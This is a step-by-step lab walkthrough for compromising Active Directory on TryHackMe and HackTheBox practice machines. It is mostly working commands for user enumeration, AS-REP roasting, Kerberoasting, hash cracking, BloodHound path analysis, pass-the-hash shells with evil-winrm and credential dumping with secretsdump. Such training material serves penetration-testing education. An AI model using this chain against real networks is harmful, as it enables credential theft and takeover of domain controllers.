# Full AD Enumeration Chain Exercise

Complete end-to-end walkthrough targeting TryHackMe "Attacktive Directory" or HTB "Forest".

## Target Rooms

- TryHackMe "Attacktive Directory": https://tryhackme.com/room/attacktivedirectory
- HTB "Forest" (retired, requires VIP): https://app.hackthebox.com/machines/Forest

## Step 1 — Initial Recon

```bash
export DC=TARGET_IP
export DOMAIN=spookysec.local   # replace with actual domain

nmap -sV -p 88,389,445,3389,5985 $DC
```

Expected open ports: 88 (Kerberos), 389 (LDAP), 445 (SMB), likely 3389 or 5985.

## Step 2 — SMB Null Session

```bash
smbclient -L //$DC -N
smbmap -H $DC -u '' -p ''
```

Note: which shares are accessible anonymously?

## Step 3 — User Enumeration

```bash
# Kerbrute against DC
kerbrute userenum --dc $DC -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Or use nxc if you have any creds
nxc smb $DC -u '' -p '' --users
```

Save valid usernames to `users.txt`.

## Step 4 — AS-REP Roasting

```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC -no-pass -format hashcat -outputfile asrep.txt
cat asrep.txt
```

If hashes captured:
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Step 5 — Use Cracked Credentials

```bash
# Confirm creds work
nxc smb $DC -u cracked_user -p 'CrackedPassword'

# Enumerate with creds
nxc smb $DC -u cracked_user -p 'CrackedPassword' --shares --users --groups
nxc ldap $DC -u cracked_user -p 'CrackedPassword' --kerberoasting kerb.txt
```

## Step 6 — Kerberoasting

```bash
GetUserSPNs.py $DOMAIN/cracked_user:'CrackedPassword' -dc-ip $DC -request -outputfile kerb_hashes.txt
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Step 7 — BloodHound Collection

```bash
bloodhound-python -u cracked_user -p 'CrackedPassword' -d $DOMAIN -c All -ns $DC
```

```bash
# Start BloodHound
sudo neo4j start
bloodhound &
# Import the JSON files collected above
```

In BloodHound: run "Shortest Paths to Domain Admins" — follow the attack path.

## Step 8 — Access DC

```bash
# If DA creds obtained
evil-winrm -i $DC -u Administrator -p 'DomainAdminPassword'

# Or with hash
evil-winrm -i $DC -u Administrator -H NTLM_HASH
secretsdump.py $DOMAIN/Administrator:'Password'@$DC
```

## Documentation Template

| Step | Command | Output/Finding |
|------|---------|----------------|
| 1 | nmap | Ports 88,389,445 open |
| 2 | smbclient | SYSVOL, NETLOGON readable |
| 3 | kerbrute | 3 valid users found |
| 4 | GetNPUsers | 1 AS-REP hash captured |
| 5 | hashcat | Password cracked: Welcome1 |
| 6 | GetUserSPNs | 1 service ticket captured |
| 7 | bloodhound | DA path: svc_user → GenericWrite → DA |
| 8 | evil-winrm | Shell as Administrator |
